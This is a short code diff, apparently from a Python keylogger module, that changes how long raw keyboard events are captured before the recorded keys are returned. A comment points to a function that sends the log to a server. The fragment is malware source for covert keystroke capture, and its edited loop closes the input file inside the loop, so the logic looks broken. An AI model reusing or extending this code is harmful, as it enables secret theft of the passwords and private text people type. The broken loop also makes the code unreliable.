@@ -76,14 +76,12 @@ def run(**args):
 
 			# clear the last key pressed
 			candidate = False
-		x += 1
+		stop = time.clock()
 		event = in_file.read(EVENT_SIZE)
-		if(x%10 == 0):
-			stop = time.clock()
-			print stop-start
-			in_file.close()
+		if(stop-start >= 5):
 			return str(pressedKey)
-
+		
+		in_file.close()
 	
 	
 # send log to the server function
